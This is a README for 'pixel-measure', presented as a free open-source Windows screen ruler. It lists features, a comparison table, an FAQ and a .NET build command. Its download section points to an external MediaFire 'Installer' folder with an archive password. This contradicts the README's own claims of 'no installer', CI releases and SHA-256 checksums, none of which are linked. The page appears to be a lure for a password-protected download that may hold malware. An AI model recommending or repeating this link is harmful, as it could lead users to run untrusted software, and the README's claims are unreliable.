# pixel-measure

📏 Free, open-source screen ruler for Windows — measure pixels, spacing and angles over any app. 100 MB portable, offline, no account, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Pixel-exact ruler** — horizontal, vertical and free-angle rulers snap to pixel edges over any window
- ✅ **Magnifier loupe** — 4x to 16x zoom with a crosshair grid for picking exact boundaries
- ✅ **Guides and markers** — drop persistent guide lines to check alignment across a design or build
- ✅ **Click-through mode** — rulers stay visible but pass clicks to the app underneath, so nothing is blocked
- ✅ **Multi-monitor and DPI aware** — per-monitor scaling handled; measurements stay true at 125 percent and 150 percent
- ✅ **Copy measurements** — one hotkey copies position, size and distance values as text
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why pixel-measure

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **pixel-measure** | Screen Calipers | JR Screen Ruler | Pixel Ruler |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | $29.95 | Free | Free |
| Open source | **Yes** | No | No | No |
| Any-angle measurement | **Yes** | Yes | No | No |
| Magnifier loupe | **Yes** | No | No | Partial |
| Multi-monitor DPI aware | **Yes** | Partial | No | No |
| Portable, no install | **Yes, 100 MB** | Installer | Zip | Installer |

## FAQ

**how to measure pixels on screen in Windows?**

There is no built-in ruler beyond Paint tricks, and freeware rulers were built for 96 DPI single monitors and drift on modern scaling. pixel-measure is DPI-aware per monitor, adds a magnifier for exact edge picking, and its click-through mode never blocks the app below. It is a 100 MB portable exe, MIT, fully offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark overlay ruler (accent amber #F59E0B): 384 px span marked, tick labels every 10 px, mm toggle, readout chip showing X 128, Y 640.
2. Magnifier loupe at 16x with crosshair grid centered on a button edge, pixel color coordinates below, freeze-frame toggle on.
3. Settings: units px or mm, opacity slider at 80 percent, hotkey list, click-through toggle highlighted, per-monitor DPI status cards.

## Download

| Source | Link |
|---|---|
| 💾 **Installer pixel-measure** | [Installer pixel-measure](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).